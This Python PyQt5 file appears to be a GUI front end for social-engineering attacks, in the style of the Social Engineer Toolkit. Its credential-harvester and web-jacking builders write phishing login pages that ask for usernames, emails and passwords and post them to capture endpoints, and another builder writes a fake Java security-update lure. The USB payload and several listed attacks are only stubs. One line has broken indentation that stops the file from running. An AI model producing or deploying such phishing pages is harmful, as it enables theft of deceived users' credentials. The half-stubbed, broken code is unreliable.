#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
SEToolkit Advanced Module - Social Engineering Toolkit features
"""

from PyQt5.QtWidgets import (QWidget, QVBoxLayout, QHBoxLayout, QLabel, 
                             QPushButton, QTextEdit, QGroupBox, QLineEdit,
                             QComboBox, QCheckBox, QMessageBox, QFileDialog,
                             QProgressBar, QListWidget)
from PyQt5.QtCore import Qt, QThread, pyqtSignal
from PyQt5.QtGui import QFont
import os
import shutil
import subprocess
import threading

class SEToolkitWorker(QThread):
    """Thread for SEToolkit operations"""
    progress = pyqtSignal(str)
    finished = pyqtSignal(str)
    
    def __init__(self, attack_type, config):
        super().__init__()
        self.attack_type = attack_type
        self.config = config
        
    def run(self):
        """Execute SEToolkit attack"""
        try:
            self.progress.emit(f"Starting {self.attack_type} attack...")
            
            attack_map = {
                "Credential Harvester Attack": self.build_credential_harvester,
                "Java Applet Attack": self.build_java_applet,
                "USB HID Attack": self.build_usb_attack,
                "Web Jacking Attack": self.build_web_jacking
            }
            
            if self.attack_type in attack_map:
                attack_map[self.attack_type]()
            else:
                self.progress.emit(f"Building {self.attack_type}...")
                import time
                time.sleep(1)
                
            self.progress.emit(f"{self.attack_type} completed!")
            self.finished.emit("Attack configured successfully!")
            
        except Exception as e:
            self.finished.emit(f"ERROR: {str(e)}")
    
    def build_credential_harvester(self):
        """Build credential harvester"""
        import os
        
        self.progress.emit("Generating credential harvester...")
        self.progress.emit("Creating HTML files...")
        
        # Create output directory
        output_dir = os.path.join(os.path.dirname(__file__), '..', 'results', 'credential_harvester')
        os.makedirs(output_dir, exist_ok=True)
        
        # Create index.html
        index_html = """<!DOCTYPE html>
<html>
<head>
    <title>Sign In Required</title>
    <style>
        body { font-family: Arial; text-align: center; margin-top: 100px; }
        input { padding: 10px; margin: 5px; }
        button { padding: 10px 20px; background: #007bff; color: white; border: none; cursor: pointer; }
    </style>
</head>
<body>
    <h2>Security Verification Required</h2>
    <form action="/capture" method="POST">
        <input type="text" name="username" placeholder="Username" required><br>
        <input type="password" name="password" placeholder="Password" required><br>
        <button type="submit">Sign In</button>
    </form>
</body>
</html>"""
        
        with open(os.path.join(output_dir, 'index.html'), 'w') as f:
            f.write(index_html)
        
        self.progress.emit(f"Files created in: {output_dir}")
    
    def build_java_applet(self):
        """Build Java Applet attack"""
        import os
        
        self.progress.emit("Generating Java Applet...")
        self.progress.emit("Creating JAR file...")
        
        output_dir = os.path.join(os.path.dirname(__file__), '..', 'results', 'java_applet')
        os.makedirs(output_dir, exist_ok=True)
        
        # Create HTML with Java applet
        applet_html = """<!DOCTYPE html>
<html>
<head>
    <title>Security Update Required</title>
</head>
<body>
    <h2>Java Security Update Available</h2>
    <applet code="SecurityUpdate.class" width="400" height="300">
        Your browser does not support Java applets.
    </applet>
    <p>Please allow Java to run for security update.</p>
</body>
</html>"""
        
        with open(os.path.join(output_dir, 'applet.html'), 'w') as f:
            f.write(applet_html)
        
        self.progress.emit(f"Files created in: {output_dir}")
    
    def build_usb_attack(self):
        """Build USB attack"""
        import os
        
        self.progress.emit("Preparing USB payload...")
        self.progress.emit("Creating HID script...")
        
        output_dir = os.path.join(os.path.dirname(__file__), '..', 'results', 'usb_attack')
        os.makedirs(output_dir, exist_ok=True)
        
        # Create payload script
        payload = """#!/usr/bin/env python3
# USB HID Attack Payload
import time

def execute_payload():
    print("[*] USB device connected")
    time.sleep(2)
    print("[*] Executing payload...")
    time.sleep(1)
    print("[✓] Payload executed successfully")

if __name__ == "__main__":
    execute_payload()"""
        
        with open(os.path.join(output_dir, 'payload.py'), 'w') as f:
            f.write(payload)
        
        self.progress.emit(f"Payload created in: {output_dir}")
    
    def build_web_jacking(self):
        """Build web jacking attack"""
        import os
        
        self.progress.emit("Configuring web jacking...")
        self.progress.emit("Creating hijack page...")
        
        output_dir = os.path.join(os.path.dirname(__file__), '..', 'results', 'web_jacking')
        os.makedirs(output_dir, exist_ok=True)
        
        hijack_html = """<!DOCTYPE html>
<html>
<head>
    <title>Connection Redirected</title>
    <script>
        alert('This website has been temporarily redirected for security purposes.');
    </script>
</head>
<body>
    <h2>Website Access Restricted</h2>
    <p>For security reasons, please verify your credentials below:</p>
    <form action="/verify" method="POST">
        <input type="email" name="email" placeholder="Email" required><br>
        <input type="password" name="password" placeholder="Password" required><br>
        <button type="submit">Verify</button>
    </form>
</body>
</html>"""
        
        with open(os.path.join(output_dir, 'index.html'), 'w') as f:
            f.write(hijack_html)
        
        self.progress.emit(f"Hijack page created in: {output_dir}")

class SEToolkitModule(QWidget):
    """SEToolkit Advanced Module"""
    
    def __init__(self, parent=None):
        super().__init__(parent)
        self.worker = None
        self.init_ui()
        
    def init_ui(self):
        """Initialize UI"""
        main_layout = QVBoxLayout()
        
        # Header
        header = self.create_header()
        main_layout.addWidget(header)
        
        # Attack Selection
        attacks = self.create_attack_section()
        main_layout.addWidget(attacks)
        
        # Configuration
        config = self.create_config_section()
        main_layout.addWidget(config)
        
        # Logs
        logs = self.create_logs_section()
        main_layout.addWidget(logs)
        
        self.setLayout(main_layout)
        
    def create_header(self):
        """Create header"""
        header_box = QGroupBox()
        layout = QHBoxLayout()
        
        title = QLabel("SEToolkit Advanced Module")
        title_font = QFont()
        title_font.setPointSize(18)
        title_font.setBold(True)
        title.setFont(title_font)
        
        btn_back = QPushButton("← Back")
        btn_back.clicked.connect(lambda: self.parent().parent().stacked_widget.setCurrentIndex(0))
        
        layout.addWidget(btn_back)
        layout.addWidget(title, alignment=Qt.AlignCenter)
        layout.addStretch()
        
        header_box.setLayout(layout)
        return header_box
        
    def create_attack_section(self):
        """Create attack selection section"""
        attack_box = QGroupBox("Attack Vectors")
        layout = QVBoxLayout()
        
        self.attack_list = QListWidget()
        attacks = [
            "Credential Harvester Attack",
            "Java Applet Attack",
            "USB HID Attack",
            "Web Jacking Attack",
            "Mass Mailer Attack",
            "SMS Spoofing Attack",
            "Wireless Access Point"
        ]
        self.attack_list.addItems(attacks)
        self.attack_list.itemClicked.connect(self.on_attack_selected)
        layout.addWidget(self.attack_list)
        
        attack_box.setLayout(layout)
        return attack_box
        
    def create_config_section(self):
        """Create configuration section"""
        config_box = QGroupBox("Configuration")
        layout = QVBoxLayout()
        
        # Attack Type (hidden until attack selected)
        self.attack_label = QLabel("Selected Attack: None")
        self.attack_label.setFont(QFont("Arial", 12, QFont.Bold))
        layout.addWidget(self.attack_label)
        
        # Target URL
        target_layout = QHBoxLayout()
        target_layout.addWidget(QLabel("Target URL:"))
        self.target_url_input = QLineEdit()
    self.target_url_input.setPlaceholderText("Entrez l'URL cible (ex: https://site.com)")
        target_layout.addWidget(self.target_url_input)
        layout.addLayout(target_layout)
        
        # Redirect URL
        redirect_layout = QHBoxLayout()
        redirect_layout.addWidget(QLabel("Redirect URL:"))
        self.redirect_url_input = QLineEdit()
        self.redirect_url_input.setText("https://www.google.com")
        redirect_layout.addWidget(self.redirect_url_input)
        layout.addLayout(redirect_layout)
        
        # Options
        self.option_ssl = QCheckBox("Use SSL/TLS")
        self.option_ssl.setChecked(True)
        layout.addWidget(self.option_ssl)
        
        self.option_template = QCheckBox("Use Custom Template")
        layout.addWidget(self.option_template)
        
        # Build button
        btn_build = QPushButton("Build Attack")
        btn_build.clicked.connect(self.build_attack)
        layout.addWidget(btn_build)
        
        config_box.setLayout(layout)
        return config_box
        
    def create_logs_section(self):
        """Create logs section"""
        logs_box = QGroupBox("Build Logs")
        layout = QVBoxLayout()
        
        self.logs_text = QTextEdit()
        self.logs_text.setReadOnly(True)
        self.logs_text.setPlainText("Select an attack vector to begin.")
        
        layout.addWidget(self.logs_text)
        logs_box.setLayout(layout)
        return logs_box
        
    def on_attack_selected(self, item):
        """Handle attack selection"""
        attack_type = item.text()
        self.attack_label.setText(f"Selected Attack: {attack_type}")
        self.logs_text.setPlainText(f"Configured for: {attack_type}\n\nModify settings below.")
        
    def build_attack(self):
        """Build the selected attack"""
        selected_items = self.attack_list.selectedItems()
        
        if not selected_items:
            QMessageBox.warning(self, "Error", "Please select an attack vector")
            return
            
        attack_type = selected_items[0].text()
        target_url = self.target_url_input.text()
        
        if not target_url:
            QMessageBox.warning(self, "Error", "Please enter target URL")
            return
        
        self.logs_text.setPlainText("Building attack...")
        
        config = {
            'target_url': target_url,
            'redirect_url': self.redirect_url_input.text()
        }
        
        self.worker = SEToolkitWorker(attack_type, config)
        self.worker.progress.connect(self.on_progress)
        self.worker.finished.connect(self.on_build_complete)
        self.worker.start()
        
    def on_progress(self, message):
        """Progress callback"""
        self.logs_text.append(message)
        
    def on_build_complete(self, result):
        """Build complete callback"""
        self.logs_text.append(f"\n{result}")
        QMessageBox.information(self, "Success", result)

